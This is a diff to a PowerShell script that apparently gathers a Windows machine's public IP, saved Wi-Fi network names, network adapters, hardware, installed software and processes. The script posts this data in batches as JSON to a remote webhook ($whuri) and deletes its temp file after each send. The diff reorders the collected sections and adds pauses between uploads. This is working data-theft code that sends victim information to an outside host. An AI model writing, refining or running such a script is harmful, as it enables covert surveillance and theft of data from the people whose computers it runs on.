@@ -65,6 +65,12 @@ $outpath = "$env:temp\systeminfo.txt"
 "Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Saved Networks     : `n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($network| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
+"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 
 $Pathsys = "$env:temp\systeminfo.txt"
 $msgsys = Get-Content -Path $Pathsys -Raw 
@@ -74,14 +80,9 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME"
 Start-Sleep 1
 Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
 Remove-Item -Path $Pathsys -force
+Start-Sleep 1
 
-"NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Saved Networks     : `n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($network| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"HARDWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"HARDWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII
 "computer           : $computerSystem" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "BIOS Info          : $computerBIOS" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "RAM Info           : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append
@@ -96,6 +97,7 @@ Remove-Item -Path $Pathsys -force
 ($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 
+
 $Pathsys = "$env:temp\systeminfo.txt"
 $msgsys = Get-Content -Path $Pathsys -Raw 
 $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
@@ -104,8 +106,9 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME"
 Start-Sleep 1
 Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
 Remove-Item -Path $Pathsys -force
+Start-Sleep 1
 
-"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII
 "Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($software| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
